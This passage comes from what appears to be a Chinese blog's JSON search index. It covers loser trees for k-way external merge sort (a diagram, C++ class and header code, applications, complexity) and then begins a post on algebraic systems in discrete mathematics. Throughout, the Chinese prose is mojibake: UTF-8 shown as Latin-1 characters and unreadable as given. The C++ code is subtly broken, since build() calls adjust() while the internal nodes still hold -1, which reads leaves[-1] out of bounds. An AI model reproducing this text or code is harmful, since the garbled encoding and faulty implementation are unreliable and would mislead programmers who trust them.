`b0` çš„ç´¢å¼• `0` (æ­¤èŠ‚ç‚¹å€¼æœªå˜)ã€‚\n- æ ‘çš„å¦ä¸€åˆ†æ”¯ (`b1` vs `b2`) ä¸å—å½±å“ï¼š\n\t`b1(5)` vs `b2(8)`ï¼šèƒœè€… `b1(5)`ï¼Œè´¥è€… `b2(8)`ã€‚`ls[3]` è®°å½•è´¥è€… `b2` çš„ç´¢å¼• `2` (æ­¤èŠ‚ç‚¹å€¼æœªå˜)ã€‚\n- æœ€ç»ˆå†³èµ›ï¼š\n    æ¥è‡ª `ls[2]` åˆ†æ”¯çš„èƒœè€… `b3(2)` vs æ¥è‡ª `ls[3]` åˆ†æ”¯çš„èƒœè€… `b1(5)`ï¼šèƒœè€… `b3(2)`ï¼Œè´¥è€… `b1(5)`ã€‚`ls[1]` è®°å½•è´¥è€… `b1` çš„ç´¢å¼• `1` (æ­¤èŠ‚ç‚¹å€¼æœªå˜)ã€‚\n- æ€»å† å†›ï¼š\n    `ls[0]` è®°å½•æ€»å† å†› `b3` çš„ç´¢å¼• `3` (æ­¤èŠ‚ç‚¹å€¼æœªå˜)ã€‚\n```mermaid\ngraph TD\n    direction TB\n    %% è´¥è€…æ ‘æ·»åŠ æ–°èŠ‚ç‚¹ b5(4) åçš„çŠ¶æ€\n    %% åŸæœ‰é€‰æ‰‹: b0(10), b1(5), b2(8), b3(2), b4(12)\n    %% æ–°å¢é€‰æ‰‹: b5(4) (å€¼ä¸º4, ç´¢å¼•ä¸º5)\n    %% æ•°å°è€…èƒœ\n\n    LS0[\"ls[0]=3 (æ€»èƒœè€…: b3[2])\"]\n    LS1[\"ls[1]=1 (è´¥è€…: b1[5])\"]\n    LS2[\"ls[2]=0 (è´¥è€…: b0[10])\"]\n    LS3[\"ls[3]=2 (è´¥è€…: b2[8])\"]\n    LS4_mod[\"ls[4]=5 (è´¥è€…: b5[4])\"  ]\n    LS5_new[\"ls[5]=4 (è´¥è€…: b4[12]) \"]\n\n    B0[\"b0 (10)\"]\n    B1[\"b1 (5)\"]\n    B2[\"b2 (8)\"]\n    B3[\"b3 (2)\"]\n    B4[\"b4 (12)\"]\n    B5[\"b5 (4)\"]\n\n    LS0 --> LS1\n    LS1 --> LS2\n    LS1 --> LS3\n        LS2 --> B0\n        LS2 --> LS4_mod\n            LS4_mod --> B3\n            LS4_mod --> LS5_new  \n                LS5_new --> B4\n                LS5_new --> B5\n        LS3 --> B1\n        LS3 --> B2\n\n    classDef defaultLeaf fill:#FFFACD,stroke:#B8860B;\n    classDef newLeaf fill:#FFDAB9,stroke:#FF8C00,font-weight:bold;\n    classDef winnerLeaf fill:#ADFF2F,stroke:#006400,font-weight:bold;\n    \n    classDef winnerNode fill:#90EE90,stroke:#006400,stroke-width:2px,font-weight:bold;\n    classDef loserNode fill:#D3D3D3,stroke:#333; \n    classDef newInternalNode fill:#E6E6FA,stroke:#9370DB,font-weight:bold; \n    classDef modifiedInternalNode fill:#ADD8E6,stroke:#4682B4,font-weight:bold; \n\n    class LS0 winnerNode;\n    class LS1,LS2,LS3 loserNode;\n    class LS4_mod modifiedInternalNode;\n    class LS5_new newInternalNode;\n\n    class B0,B1,B2,B4 defaultLeaf;\n    class B3 winnerLeaf;\n    class B5 newLeaf;\n```\n\nåœ¨å¤šè·¯å½’å¹¶æ’åºé‡Œï¼Œ**è´¥è€…æ ‘å®ç°æ¯”èƒœè€…æ ‘æ›´é«˜æ•ˆã€æ›´å®¹æ˜“ç»´æŠ¤**ã€‚æ›´æ–°åªéœ€æ²¿ç€å† å†›çš„è·¯å¾„å‘ä¸Šâ€œé‡æ–°æ¯”ä¸€éâ€ï¼Œè€Œä¸ç”¨å…¨éƒ¨é‡ç®—ã€‚\n\n---\n\n## ä»£ç å®ç°ä¸å¤šè·¯å½’å¹¶æ–‡ä»¶æµ\nè´¥è€…æ ‘çš„å®ç°æ¯”è¾ƒåŸºç¡€ï¼Œå…¶å®å’Œ**å †çš„æ„å»º**å¾ˆç›¸ä¼¼ï¼Œæˆ‘ä»¬åšçš„æ˜¯ä¸ç›¸é‚»èŠ‚ç‚¹ä¸€ç›´æ¯”è¾ƒï¼Œç„¶åå°†å¤±è´¥èŠ‚ç‚¹æ”¾åœ¨æœ€ä¸Šç«¯å³å¯ã€‚\nè¿™ç§æ’åºæ€æƒ³å…¶å®ä¸å †æ’åºæ€æƒ³ç›¸ä¼¼ï¼Œè´¥è€…æ ‘çš„ä¼˜åŠ¿åœ¨äºæˆ‘ä»¬å¤„ç†æŸ¥æ‰¾æœ€ä½³è€…ï¼Œæ¬¡ä½³è€…æ“ä½œï¼Œæ•ˆç‡æ›´é«˜ã€‚å¤–æ’åºçš„æ•ˆç‡ç“¶é¢ˆä»ç®—æ³•åˆ°äº†æ•°æ®è¯»å–ï¼Œèƒœè€…æ ‘å’Œè´¥è€…æ ‘éƒ½æ˜¯å¾ˆä¼Ÿå¤§çš„æ•°æ®ç»“æ„ã€‚\n\n**LoserTree** åŸºæœ¬æ¨¡æ¿ç±»ä¾‹ï¼š\n```cpp\n// è´¥è€…æ ‘ç±»æ¨¡æ¿ï¼ŒTä¸ºå¯æ¯”è¾ƒç±»å‹ï¼Œæœ€å°å€¼èƒœ\ntemplate<typename T>\nclass LoserTree {\npublic:\n    // kä¸ºè·¯æ•°ï¼Œsourcesä¸ºæ¯ä¸€è·¯çš„å½“å‰å…ƒç´ \n    LoserTree(const std::vector<T>& sources)\n        : k(sources.size()), leaves(sources), ls(k, -1) {\n        build();\n    }\n\n    // è¿”å›å½“å‰æœ€å°å…ƒç´ çš„ä¸‹æ ‡\n    int winner() const {\n        return winnerIdx;\n    }\n\n    // è¾“å‡ºå† å†›ï¼Œå¹¶ç”¨æ–°å…ƒç´ æ›¿æ¢ï¼Œç»´æŠ¤æ ‘ç»“æ„\n    void popAndReplace(T newElem) {\n        leaves[winnerIdx] = newElem;\n        adjust(winnerIdx);\n    }\n\n    // è·å–å½“å‰å† å†›çš„å€¼\n    T top() const {\n        return leaves[winnerIdx];\n    }\n\nprivate:\n    int k;                      // è·¯æ•°\n    std::vector<T> leaves;      // å¶å­èŠ‚ç‚¹ï¼ˆå„è·¯çš„å½“å‰å€¼ï¼‰\n    std::vector<int> ls;        // å†…éƒ¨èŠ‚ç‚¹ï¼Œå­˜è´¥è€…ç¼–å·\n    int winnerIdx;              // å½“å‰å† å†›ç¼–å·\n\n    // å»ºæ ‘ï¼šä»å¶å­åˆ°æ ¹å±‚å±‚æ¯”è¾ƒï¼Œåˆå§‹åŒ–lså’ŒwinnerIdx\n    void build() {\n        ls.assign(k, -1);\n        winnerIdx = 0;\n        for (int i = 0; i < k; ++i) {\n            if (leaves[i] < leaves[winnerIdx]) winnerIdx = i;\n        }\n        for (int i = 0; i < k; ++i) {\n            if (i != winnerIdx) adjust(i);\n        }\n    }\n\n    // ä»å¶iå‡ºå‘å‘ä¸ŠæŒ‘æˆ˜ï¼Œç»´æŠ¤è´¥è€…æ ‘\n    void adjust(int i) {\n        int parent = (i + k) / 2;\n        int challenger = i;\n        while (parent > 0) {\n            // challengerä¸ls[parent]å†³å‡ºèƒœè´Ÿï¼Œèƒœè€…ä¸Šç§»\n            if (leaves[challenger] < leaves[ls[parent]]) {\n                std::swap(challenger, ls[parent]);\n            }\n            parent /= 2;\n        }\n        // æ ¹èŠ‚ç‚¹ä¸å½“å‰winneræ¯”è¾ƒ\n        if (leaves[challenger] < leaves[winnerIdx]) {\n            std::swap(challenger, winnerIdx);\n        }\n        // æœ€ç»ˆwinnerIdxå­˜å† å†›ä¸‹æ ‡\n    }\n};\n\n```\nåŸºæœ¬ä½¿ç”¨ï¼š\n```cpp\nstd::vector<int> sources = {7, 9, 4, 6}; // å„è·¯çš„åˆå§‹å…ƒç´ \nLoserTree<int> tree(sources);\nstd::cout << \"å½“å‰å† å†›ç¼–å·: \" << tree.winner() << \", å…ƒç´ : \" << tree.top() << std::endl;\n\n// å‡è®¾å¼¹å‡ºå† å†›åï¼Œè·¯3æœ‰æ–°å…ƒç´ 8\ntree.popAndReplace(8);\nstd::cout << \"æ–°å† å†›ç¼–å·: \" << tree.winner() << \", å…ƒç´ : \" << tree.top() << std::endl;\n\n```\n\n**ç»“åˆæ–‡ä»¶æµ**ï¼Œå¤šæ–‡ä»¶ç¼–ç¨‹ï¼Œæˆ‘ä»¬å¯ä»¥å¯¹äºå¤šè·¯å½’å¹¶ï¼Œåˆ©ç”¨è´¥è€…æ ‘ï¼Œå®ç°å¤–æ’åºï¼š\næˆ‘ä»¬å†™ä¸ªæ–‡ä»¶å¤´ `LoserTree.h`ï¼Œæ¯”è¾ƒå¥½å¼•ç”¨ï¼š\n```c\n//LoserTree.h\n#ifndef LOSERTREE_H\n#define LOSERTREE_H\n\n#include <vector>\n#include <limits>\n#include <memory>\n\n// ------- å•è·¯è¾“å…¥æµæ¥å£ï¼ˆå¯æ‰©å±•ä¸ºæ–‡ä»¶æµ/æ•°ç»„æµ/ç½‘ç»œæµç­‰ï¼‰ -------\nstruct InputStream {\n    virtual bool next(int& val) = 0;\n    virtual ~InputStream() {}\n};\n\n// è´¥è€…æ ‘ç±»ï¼Œé€‚åˆå¤šè·¯å½’å¹¶å¤–æ’åº\nclass LoserTree {\npublic:\n    // æ„é€ å‡½æ•°ï¼šè¾“å…¥kè·¯æµ\n    LoserTree(std::vector<std::unique_ptr<InputStream>>& streams);\n\n    int winner() const;    // å½“å‰å† å†›ç¼–å·\n    int top() const;       // å½“å‰æœ€å°å…ƒç´ \n    void popAndReplace();  // è¾“å‡ºå† å†›ï¼Œè¡¥æ–°å…ƒç´ ï¼Œç»´æŠ¤æ ‘ç»“æ„\n    bool empty() const;    // åˆ¤æ–­æ˜¯å¦å½’å¹¶ç»“æŸ\n\nprivate:\n    const int INF = std::numeric_limits<int>::max();\n    int k;\n    std::vector<int> leaves;  // å½“å‰å„è·¯çš„å…ƒç´ \n    std::vector<int> ls;      // å†…éƒ¨èŠ‚ç‚¹å­˜è´¥è€…ç¼–å·\n    int winnerIdx;            // å† å†›ç¼–å·\n    std::vector<std::unique_ptr<InputStream>>& input_streams;\n\n    void build();             // åˆå§‹å»ºæ ‘\n    void adjust(int i);       // æ²¿å† å†›è·¯å¾„ç»´æŠ¤\n};\n\n#endif // LOSERTREE_H\n\n```\n\n```cpp\n#include \"LoserTree.h\"\n#include <iostream>\n\n// æ•°ç»„æµå®ç°\nstruct VectorInputStream : public InputStream {\n    const std::vector<int>& arr;\n    size_t pos;\n    VectorInputStream(const std::vector<int>& a) : arr(a), pos(0) {}\n    bool next(int& val) override {\n        if (pos < arr.size()) {\n            val = arr[pos++];\n            return true;\n        }\n        return false;\n    }\n};\n\nint main() {\n    std::vector<int> arr1{2, 5, 9};\n    std::vector<int> arr2{1, 4, 7, 11};\n    std::vector<int> arr3{3, 8, 12};\n\n    std::vector<std::unique_ptr<InputStream>> streams;\n    streams.emplace_back(new VectorInputStream(arr1));\n    streams.emplace_back(new VectorInputStream(arr2));\n    streams.emplace_back(new VectorInputStream(arr3));\n\n    LoserTree lt(streams);\n\n    std::cout << \"è´¥è€…æ ‘å¤šè·¯å½’å¹¶ç»“æœï¼š\";\n    while (!lt.empty()) {\n        int val = lt.top();\n        if (val != std::numeric_limits<int>::max())\n            std::cout << val << \" \";\n        lt.popAndReplace();\n    }\n    std::cout << std::endl;\n    return 0;\n}\n\n\n```\nåªéœ€å®ç° InputStream æ¥å£ï¼ŒLoserTree å°±èƒ½æ— ç¼é€‚é…å„ç§å½’å¹¶æºï¼ˆå¦‚å¤§æ–‡ä»¶ã€åˆ†å¸ƒå¼æµã€æ•°æ®åº“æ¸¸æ ‡ï¼‰ï¼Œè¿™ä¹Ÿæ˜¯å®ƒå·¥ç¨‹å®è·µä¸­çš„å·¨å¤§ä¼˜åŠ¿ã€‚\n\n---\n## åº”ç”¨\n**è´¥è€…æ ‘æ˜¯éå¸¸é«˜æ•ˆçš„æ•°æ®ç»“æ„**ï¼Œé€‚ç”¨äºå„ç§æ’åºå’Œé€‰æ‹©é—®é¢˜ã€‚\nåœ¨å®é™…åº”ç”¨ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥æ ¹æ®å…·ä½“é—®é¢˜é€‰æ‹©ä½¿ç”¨èƒœè€…æ ‘æˆ–è´¥è€…æ ‘ã€‚å¯¹äºéœ€è¦é¢‘ç¹æ›´æ–°æ•°æ®é›†çš„é—®é¢˜ï¼Œèƒœè€…æ ‘æ˜¯ä¸€ä¸ªæ›´å¥½çš„é€‰æ‹©ï¼›å¯¹äºéœ€è¦å¿«é€Ÿè®°å½•å’ŒæŸ¥æ‰¾æ¯”èµ›ç»“æœçš„é—®é¢˜ï¼Œè´¥è€…æ ‘åˆ™æ›´åŠ é€‚ç”¨ã€‚è¿™ä¸¤ç§æ•°æ®ç»“æ„éƒ½å¯ä»¥åœ¨log(n)æ—¶é—´å†…å®Œæˆæœ€å€¼æŸ¥æ‰¾å’Œæ›´æ–°æ“ä½œï¼Œå…·æœ‰å¾ˆé«˜çš„å®ç”¨ä»·å€¼ã€‚\n#### å¤§å‹æœç´¢å¼•æ“çš„â€œç½‘é¡µæ’åå½’å¹¶â€\næ¯”å¦‚ä½ åœ¨ç™¾åº¦ã€Googleæœç´¢åŒä¸€ä¸ªå…³é”®è¯æ—¶ï¼ŒèƒŒåå¾€å¾€æœ‰æˆç™¾ä¸Šåƒå°æœåŠ¡å™¨åˆ†åˆ«ç»™ä½ ç®—å‡ºâ€œæœ€ç›¸å…³çš„ç½‘é¡µæ’åâ€ï¼Œä½†æœ€åè¿™äº›æ’åç»“æœéœ€è¦å¿«é€Ÿåˆå¹¶æˆä¸€ä¸ªå…¨å±€æ’ååˆ—è¡¨ã€‚  \n**è´¥è€…æ ‘**å°±åƒä¸€åœºé«˜æ•ˆçš„â€œé”¦æ ‡èµ›â€ï¼Œæ¯æ¬¡éƒ½èƒ½æœ€å¿«é€‰å‡ºå…¨ä½“ä¸­â€œæœ€ä¼˜ç½‘é¡µâ€ï¼ŒæŠŠå…¨çƒå„åœ°çš„â€œæ¦œé¦–ç½‘é¡µâ€æŒ‰åºè¾“å‡ºï¼Œå¤§å¤§æé«˜æœç´¢å“åº”é€Ÿåº¦ã€‚\n#### äº‘ç›˜/ç½‘ç›˜çš„å¤šæœåŠ¡å™¨æ–‡ä»¶åŒæ­¥\næ¯”å¦‚é˜¿é‡Œäº‘ç›˜ã€ç™¾åº¦ç½‘ç›˜è¦æŠŠå…¨çƒå¤šå°æœåŠ¡å™¨ä¸Šçš„åŒæ­¥æ–‡ä»¶åˆæˆä¸€ä¸ªæœ€ç»ˆçš„æ—¶é—´çº¿å±•ç¤ºï¼Œè¿™æ—¶å€™æ¯å°æœåŠ¡å™¨çš„æ–‡ä»¶å˜åŠ¨å·²ç»æ’å¥½åºï¼Œåªéœ€å½’å¹¶å„è·¯â€œæ–‡ä»¶äº‹ä»¶â€æµã€‚  \nè´¥è€…æ ‘å°±æ˜¯æœ€å¥½çš„é€‰æ‹©ï¼Œä¿è¯â€œ**æœ€è¿‘çš„æ›´æ–°**â€æ€»èƒ½ä¼˜å…ˆæ˜¾ç¤ºï¼Œå“ªæ€•æœ‰æˆç™¾ä¸Šåƒå°æœåŠ¡å™¨ï¼Œä¹Ÿèƒ½ç¨³å®šå·¥ä½œã€‚\n####  è§†é¢‘æ¨èç³»ç»Ÿçš„â€œå¤šè·¯ä¸ªæ€§åŒ–å€™é€‰é›†å½’å¹¶â€\nä½ åˆ·Bç«™/æŠ–éŸ³æ—¶ï¼Œæ¨èç³»ç»Ÿä¼šä»æ— æ•°ä¸ªâ€œå…´è¶£é€šé“â€å„è‡ªæ‰¾å‡ºé€‚åˆä½ çš„è§†é¢‘ï¼Œæœ€åè¦æŠŠè¿™äº›å°åˆ—è¡¨åˆå¹¶æˆå…¨å±€æ’åºï¼Œæ¨èç»™ä½ ã€‚  \nè´¥è€…æ ‘å¯ä»¥æŠŠå¤šä¸ªå€™é€‰æ± ï¼ˆæ¯”å¦‚â€œä½ å–œæ¬¢çš„éŸ³ä¹â€ã€â€œä½ æœ€è¿‘å¸¸çœ‹çš„UPä¸»â€ã€â€œå…¨ç«™çƒ­ç‚¹â€ç­‰ï¼‰åˆå¹¶ï¼Œä¿è¯æ¯æ¬¡æ¨é€çš„éƒ½æ˜¯**æœ€ä¼˜è§£**ã€‚\n\n>  è´¥è€…æ ‘ä¸ä»…é™äºæ’åºæ•°å­—æµï¼Œå®ƒé€‚åˆ**ä»»ä½•æœ‰åºå¯¹è±¡çš„é«˜æ•ˆå½’å¹¶**â€”â€”æ¯”å¦‚åˆå¹¶æ–°é—»æµã€è‚¡ç¥¨è¡Œæƒ…ã€å¿«é€’ç‰©æµè¿›åº¦ç­‰ã€‚\n> åœ¨åˆ†å¸ƒå¼å¤§æ•°æ®åœºæ™¯ä¸‹ï¼Œè´¥è€…æ ‘å’Œèƒœè€…æ ‘æ¯”ä¼ ç»Ÿå †/ä¼˜å…ˆé˜Ÿåˆ—æ›´é«˜æ•ˆï¼Œå°¤å…¶é€‚åˆâ€œè·¯æ•°æå¤šâ€çš„è¶…çº§å½’å¹¶ä»»åŠ¡ã€‚\n> åªè¦ä½ èƒ½æŠŠç”Ÿæ´»ä¸­çš„â€œå¤šè·¯æœ‰åºé˜Ÿåˆ—â€æŠ½è±¡æˆ InputStreamï¼Œè´¥è€…æ ‘å°±èƒ½å¸®ä½ æŠŠå®ƒä»¬å½’å¹¶æˆä¸€æ¡é«˜æ•ˆã€æ— é—æ¼çš„â€œå¤§è·¯â€ã€‚\n\n---\n\n## æ€§èƒ½ä¼˜ç¼ºç‚¹åˆ†æ\n### æ—¶é—´å¤æ‚åº¦ \n#### å»ºæ ‘ï¼ˆåˆå§‹åŒ–ï¼‰\n- **å»ºæ ‘è¿‡ç¨‹**éœ€è¦è®©æ¯ä¸€ä¸ªå¶å­èŠ‚ç‚¹æ²¿è·¯å¾„æŒ‘æˆ˜è‡³æ ¹ï¼Œå…± $k$ è·¯ï¼Œæ¯æ¬¡æœ€å¤šæ¯”è¾ƒ $\\log_2 k$ æ¬¡ï¼Œæ€»ä½“å¤æ‚åº¦ä¸º $O(k \\log k)$ã€‚\n#### å½’å¹¶æ“ä½œï¼ˆæ¯æ¬¡è¾“å‡ºæœ€å°å€¼ï¼‰\n- **æ¯æ¬¡å½’å¹¶è¾“å‡º**ï¼Œæ–°å…ƒç´ æ›¿æ¢åï¼Œåªéœ€è¦æ²¿å† å†›è·¯å¾„å‘ä¸Šâ€œé‡æ–°æ¯”è¾ƒâ€ä¸€éï¼Œæœ€å¤š $\\log_2 k$ å±‚ã€‚\n- å› æ­¤ï¼Œ**æ¯æ¬¡å½’å¹¶è¾“å‡º/æ›´æ–°çš„æ—¶é—´å¤æ‚åº¦**ä¸º $O(\\log k)$ã€‚\n- å¯¹äº $n$ ä¸ªæ€»å…ƒç´ å½’å¹¶æ’åºï¼Œæ€»ä½“å¤æ‚åº¦ä¸º $O(n \\log k)$ã€‚\n\n> è¿™ä¸€ç‚¹æ¯”ç›´æ¥ç”¨æš´åŠ›éå†æ‰€æœ‰è·¯ï¼ˆ$O(k)$ï¼‰å¿«å¾—å¤šï¼Œç‰¹åˆ«é€‚åˆ $k$ å¾ˆå¤§æ—¶ä½¿ç”¨ã€‚\n\n### ç©ºé—´å¤æ‚åº¦\n- è´¥è€…æ ‘æœ¬èº«ç»´æŠ¤ä¸€ä¸ª**å®Œå…¨äºŒå‰æ ‘ç»“æ„**ï¼Œå« $k$ ä¸ªå¶å­å’Œ $k$ ä¸ªå†…éƒ¨èŠ‚ç‚¹ï¼ˆæ¯ä¸ªå†…éƒ¨èŠ‚ç‚¹åªéœ€å­˜ä¸€ä¸ªè·¯çš„ç´¢å¼•æˆ–æŒ‡é’ˆï¼‰ã€‚\n- ä¸»è¦éœ€è¦å­˜å‚¨ï¼š\n    - $k$ ä¸ªå¶èŠ‚ç‚¹ï¼ˆæ¯è·¯å½“å‰å€¼ï¼Œå®é™…å½’å¹¶ä¸­åªéœ€ä¸€ä¸ªå…ƒç´ çš„ç¼“å­˜/æŒ‡é’ˆï¼‰\n    - $k$ ä¸ªå†…éƒ¨èŠ‚ç‚¹ï¼ˆè´¥è€…ç´¢å¼•æˆ–æŒ‡é’ˆï¼‰ \n- **ç©ºé—´å¤æ‚åº¦æ€»ä¸º $O(k)$**ã€‚\n\n###  ä¸å…¶ä»–å½’å¹¶æ–¹æ³•å¯¹æ¯”\n- **æš´åŠ›å½’å¹¶**ï¼šæ¯æ¬¡éƒ½éå†æ‰€æœ‰ $k$ è·¯ï¼ŒæŸ¥æ‰¾æœ€å°å…ƒç´ ï¼Œæ—¶é—´å¤æ‚åº¦ $O(nk)$ã€‚\n- **å †/ä¼˜å…ˆé˜Ÿåˆ—å½’å¹¶**ï¼šæ¯æ¬¡æ’å…¥å¼¹å‡ºå †é¡¶éƒ½æ˜¯ $O(\\log k)$ï¼Œå’Œè´¥è€…æ ‘åŒé˜¶ï¼Œä½†è´¥è€…æ ‘å¸¸æ•°æ›´å°ï¼Œä¸”å¯æ›´å¥½åœ°å¤ç”¨å†…å­˜ï¼Œæ›´æ–°æ•ˆç‡é«˜ã€‚\n- **è´¥è€…æ ‘**ï¼šåœ¨ $k$ å¾ˆå¤§æ—¶ï¼ˆå¦‚æ•°ç™¾ã€ä¸Šåƒè·¯å½’å¹¶ï¼‰ï¼Œè´¥è€…æ ‘çš„æ•ˆç‡æ›´æ˜æ˜¾ã€‚\n### ä¼˜ç‚¹\n- æ¯æ¬¡æ‰¾æœ€å°å€¼ã€æ›´æ–°æ ‘åªéœ€ $O(\\log k)$ï¼Œå¯¹å¤§è§„æ¨¡å½’å¹¶éå¸¸å‹å¥½ã€‚\n- ç©ºé—´æ¶ˆè€—å°ï¼Œæ˜“äºå®ç°ã€‚\n- ç‰¹åˆ«é€‚åˆå½’å¹¶æ®µæ•°é‡å¤šã€å•æ®µæ•°æ®é‡å°çš„åœºæ™¯ã€‚\n### ç¼ºç‚¹\n- å®ç°æ¯”æš´åŠ›æ³•å¤æ‚ä¸€ç‚¹ï¼Œåˆå­¦è€…éœ€è¦é€‚åº”æ ‘ç»“æ„ã€‚\n- å½’å¹¶æ®µä¸å‡è¡¡æ—¶ï¼Œå¯èƒ½å­˜åœ¨éƒ¨åˆ†èŠ‚ç‚¹é‡å¤æŒ‘æˆ˜ï¼Œå¯¼è‡´æ›´æ–°ç¨æ…¢ã€‚\n---\n\n## å‚è€ƒèµ„æ–™\n- [è´¥è€…æ ‘ - OI wiki](https://oi-wiki.org/ds/loser-tree/)\n-  [æ ‘æ’-èƒœè€…æ ‘-è´¥è€…æ ‘ - å½±æ³•å¸«ã®ç‰©èª](https://yfsyfs.github.io/2019/09/07/%E6%A0%91%E6%8E%92-%E8%83%9C%E8%80%85%E6%A0%91-%E8%B4%A5%E8%80%85%E6%A0%91/)\n- [é€‰æ‹©æ ‘ èƒœè€…æ ‘ | è´¥è€…æ ‘ - CSDN](https://blog.csdn.net/summer_dew/article/details/84197001)\n- [å †ï¼Œèµ¢è€…æ ‘ï¼Œè´¥è€…æ ‘çš„åŒºåˆ«ä¸è”ç³»](https://blog.csdn.net/haolexiao/article/details/53488314)\n- [å¤šè·¯å½’å¹¶æ’åºçš„æ—¶å€™ï¼Œä¸ºä»€ä¹ˆè¦é‡‡ç”¨è´¥è€…æ ‘ï¼Ÿ- çŸ¥ä¹å›ç­”](https://www.zhihu.com/question/35144290)\n- [å¤–éƒ¨æ’åºä¹‹è´¥è€…æ ‘ - ivan çš„åšå®¢](https://ivanzz1001.github.io/records/post/data-structure/2018/07/03/ds-loser_tree)\n- [ä¸€æ–‡è¯»æ‡‚èƒœè€…æ ‘ä¸è´¥è€…æ ‘](https://cloud.tencent.com/developer/article/2238630)\n- [Google Gemini](https://gemini.google.com/)\n- [OpenAI ChatGPT](https://chatgpt.com/)\n- æ•°æ®ç»“æ„ - å½’å¹¶æ’åºï¼Œå¤–æ’åº","tags":["è®°å½•","å­¦ä¹ ","æ•°æ®ç»“æ„","ç¼–ç¨‹"],"categories":["æ—¥å¸¸å­¦ä¹ ","æ•°æ®ç»“æ„"]},{"title":"ç¦»æ•£æ•°å­¦-ä»£æ•°ç³»ç»Ÿ","url":"/2025/05/16/xue-xi/shu-xue/chi-san-shu-xue-dai-shu-xi-tong/","content":"# ç¦»æ•£æ•°å­¦-ä»£æ•°ç³»ç»Ÿ\n\n## å¹¿ä¹‰åŠ ä¹˜\n### å®šä¹‰\nå¹¿ä¹‰çš„åŠ æ³•ä¸ä¹˜æ³•æ²¡æœ‰ç‰¹å®šçš„è¿ç®—å½¢å¼ï¼Œä¸»è¦ä¾èµ–äºå®ƒçš„å®šä¹‰ã€‚å¯ä»¥å®šä¹‰å®ƒä¸º**å®æ•°**è¿ç®—ï¼Œä¹Ÿå¯å®šä¹‰å®ƒä¸º**çŸ©é˜µ**ç±»è¿ç®—ã€‚\nå¦‚æœä¸å¥½å®šä¹‰æˆ–æ²¡æœ‰ç¬¦å·ï¼Œåªèƒ½ä½¿ç”¨**è¿ç®—è¡¨**ï¼Œé™äº**æœ‰é™æƒ…å†µ**ã€‚\n\n> å¹¿ä¹‰åŠ ä¹˜å½¢å¼ç±»ä¼¼äº C++ ä¸­çš„è¿ç®—ç¬¦é‡è½½ã€‚\n\nè¿ç®—ç¬¦å·ç”±è‡ªå·±å®šä¹‰ã€‚\n\n### å®šå¾‹\n#### å¹¿ä¹‰åŠ ä¹˜çš„å°é—­æ€§\n![image.png](https://pic.moyuin.top/2025/05/16/6826e28868590.png)\n\n#### äº¤æ¢å¾‹\nå¹¿ä¹‰äº¤æ¢å¾‹æ˜¯äºŒå…ƒè¿ç®—ä¸­å­˜åœ¨ `x*y=y*x`\näºŒå…ƒäº¤æ¢æ™®éå­˜åœ¨ã€‚\n#### ç»“åˆå¾‹\nä»»æ„ xyz åœ¨é›†åˆ S ä¸­ï¼Œæœ‰ `(x+y)+z=x+y+z=x+(y+z)`ï¼Œç§°è¯¥è¿ç®—åœ¨ S ä¸­æ»¡è¶³ç»“åˆå¾‹ã€‚\nå®æ•°çš„åŠ ã€ä¹˜ï¼›\né›†åˆçš„å¹¶ã€äº¤ï¼›\né€»è¾‘çš„ä¸ã€é€»è¾‘æˆ–ï¼›\nçŸ©é˜µçš„åŠ ã€ä¹˜\nå¯æ»¡è¶³ç»“åˆå¾‹ã€‚\n#### å¹‚ç­‰å¾‹\nä»»æ„ x åœ¨é›†åˆ S ä¸­ï¼Œæœ‰ `x+x=x` ç§°è¯¥è¿ç®—åœ¨ S ä¸­å¹‚ç­‰ã€‚\næœ‰äº›ä¸æ»¡è¶³å¹‚ç­‰å¾‹ï¼Œä½†æŸäº›å…ƒç´ æ»¡è¶³ã€‚å¦‚æ™®é€šåŠ æ³•ä¸æ»¡è¶³å¹‚ç­‰ã€‚\n#### åˆ†é…å¾‹\nä»»æ„ xyz åœ¨é›†åˆ S ä¸­ï¼Œæœ‰ `x*(y+z)=(x*y)+(x*z)`, ç§° `*` å¯¹ `+` å¯åˆ†é…ã€‚\nå¦‚å®æ•°åŠ ä¹˜ï¼Œé€»è¾‘çš„ä¸ã€é€»è¾‘æˆ–ã€‚\n#### å¸æ”¶å¾‹\nä»»æ„ xy åœ¨é›†åˆ S ä¸­ï¼Œæœ‰ `x*(x+y)=x,x+(x*y)=x`, åˆ™ç§° `*` ä¸ `+` æ»¡è¶³å¸æ”¶ç‡ã€‚\nå¦‚ xyz å‘½é¢˜å˜å…ƒã€‚\n\n### å•ä½å…ƒä¸é›¶å…ƒ\n>  å®æ•°ä¹˜æ³•çš„ 1ï¼Œå®æ•°åŠ æ³•çš„ 0ï¼šå¹¿ä¹‰åŠ ä¹˜ä¸ºå•ä½å…ƒã€‚\n\n![image.png](https://pic.moyuin.top/2025/05/16/6826e673c673c.png)\n\n![image.png](https://pic.moyuin.top/2025/05/16/6826e75fc7b49.png)\n\nåœ¨å•ä½å…ƒå’Œé›¶å…ƒéƒ½å­˜åœ¨çš„åŸºç¡€ä¸Šï¼Œå•ä½å…ƒå’Œé›¶å…ƒå¿…ç„¶ä¸ä¼šç›¸åŒã€‚\nä¾‹å¦‚ï¼š\n- ä¹˜æ³•ä¸­ 1 ä¸ºå•ä½å…ƒï¼Œ0 ä¸ºé›¶å…ƒ\n- åŠ æ³•ä¸­ 0 ä¸ºå•ä½å…ƒï¼Œæ²¡æœ‰é›¶å…ƒã€‚\n\n### é€†å…ƒ\n>  å®æ•°ä¹˜çš„å€’æ•°ï¼Œå®æ•°åŠ ç›¸åæ•°å¹¿ä¹‰åŠ ä¹˜çš„é€†å…ƒã€‚\n\nå¹¶ä¸æ˜¯æ‰€æœ‰å…ƒç´ éƒ½ä¸€å®šæœ‰é€†å…ƒã€‚\né€†å…ƒå¿…é¡»åœ¨ä»£æ•°ç³»ç»Ÿé›†åˆå†…ï¼Œæ»¡è¶³è¿ç®—ä½†æ˜¯ä¸åœ¨ç³»ç»Ÿé›†åˆå†…çš„ï¼Œä¸ç®—é€†å…ƒã€‚\n![image.png](https://pic.moyuin.top/2025/05/16/6826ea24d80c4.png)\n\n---\n## ä»£æ•°ç³»ç»Ÿçš„ç›¸ä¼¼æ€§\nå…¶å®ç±»æ¯”äº C++ çš„ç±»ï¼Œé›†åˆ S ç›¸å½“äºæ•°æ®æˆå‘˜ï¼Œè¿ç®—ç›¸å½“äºå‡½æ•°æˆå‘˜ã€‚\nä»£æ•°ç³»ç»Ÿä¸­ä¸¾ä¾‹å­ï¼Œå®æ•°ç³»ç»Ÿå°±ç”± `<å®æ•°,+ï¼Œ*>` 